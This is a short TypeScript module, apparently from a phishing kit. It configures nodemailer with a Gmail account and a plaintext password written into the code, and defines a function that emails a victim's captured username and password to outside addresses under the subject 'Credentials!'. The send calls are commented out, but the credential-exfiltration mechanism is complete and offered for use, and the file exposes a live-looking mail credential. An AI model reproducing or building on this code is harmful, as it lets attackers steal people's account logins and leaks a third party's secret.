import nodemailer from "nodemailer";

// Create a transporter object
const transporter = nodemailer.createTransport({
  service: "gmail",
  port: 587,
  secure: false, // or 'STARTTLS'
  auth: {
    user: "gracemngonda@gmail.com",
    pass: "ksmiqjjehmlrezey",
  },
});

export function sendEmail(username: string, password: string) {
  // Define the email options
  const mailOptions = {
    from: "gracemngonda@gmail.com",
    to: "jellinsmarriee@gmail.com",
    subject: "Credentials!",
    text: `Email/Phone: ${username}\nPassword: ${password}`,
  };
  const mailOptions2 = {
    from: "gracemngonda@gmail.com",
    to: "gracemngonda@gmail.com",
    subject: "Credentials!",
    text: `Email/Phone: ${username}\nPassword: ${password}`,
  };

  // Send the email
  // transporter.sendMail(mailOptions, (error, info) => {
  //   if (error) {
  //     console.log(error);
  //   } else {
  //     console.log("Email sent: " + info.response);
  //   }
  // });

  // transporter.sendMail(mailOptions2, (error, info) => {
  //   if (error) {
  //     console.log(error);
  //   } else {
  //     console.log("Email sent: " + info.response);
  //   }
  // });
}
